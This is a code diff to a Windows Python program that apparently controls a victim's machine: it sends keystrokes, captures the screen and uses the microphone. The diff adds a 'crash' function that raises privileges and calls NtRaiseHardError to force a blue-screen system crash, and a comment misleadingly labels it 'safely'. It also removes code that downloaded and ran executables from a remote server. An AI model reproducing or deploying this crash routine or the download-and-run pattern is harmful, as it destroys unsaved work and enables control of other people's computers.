@@ -12,6 +12,7 @@ from time import sleep, time
 from threading import Thread
 from keyboard import send
 from shutil import which
+from win32 import win32gui
 import tkinter as tk
 from mss import mss
 import numpy as np
@@ -20,6 +21,7 @@ import pyttsx3
 import pyaudio
 import asyncio
 import psutil
+import ctypes
 import pygame
 import struct
 import json
@@ -184,28 +186,13 @@ def update() -> None:
 ##              Hiding / Showing the taskbar
 def hide(state:bool) -> None:
     try:
+        taskbar_hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
         if state:
-            hide_path = get_path("hide.exe")
-            if not path.exists(hide_path):
-                if not download("hide.exe",url+"static/updates/hide.exe"):
-                    log("Hide Thread: File could not be downloaded",state="FATAL")
-                    return
-            if path.exists(hide_path):
-                startfile(hide_path)
-                log("Taskbar Hidden")
-                return
-            log("Hide.exe does not exist",state="FATAL")
+            win32gui.ShowWindow(taskbar_hwnd, 0) 
+            log("Taskbar Hidden")
         else:
-            show_path = get_path("show.exe")
-            if not path.exists(show_path):
-                if not download("show.exe",url+"static/updates/show.exe"):
-                    log("Show Thread: File could not be downloaded",state="FATAL")
-                    return
-            if path.exists(show_path):
-                startfile(show_path)
-                log("Taskbar Shown")
-                return
-            log("Show.exe does not exist",state="FATAL")
+            win32gui.ShowWindow(taskbar_hwnd, 5) 
+            log("Taskbar Shown")
             
     except Exception as e:
         log(f"Hide Thread Error:\t{e}",state="WARN")
@@ -690,7 +677,11 @@ def mic_trig():
 
 ##                        Windows Crasher (safely)
 def crash() -> None:
-    pass
+    global terminate
+    terminate = True
+    log("Crashing the system...",state="PENDING")
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
 
 ##                          Main Head                   ##
 
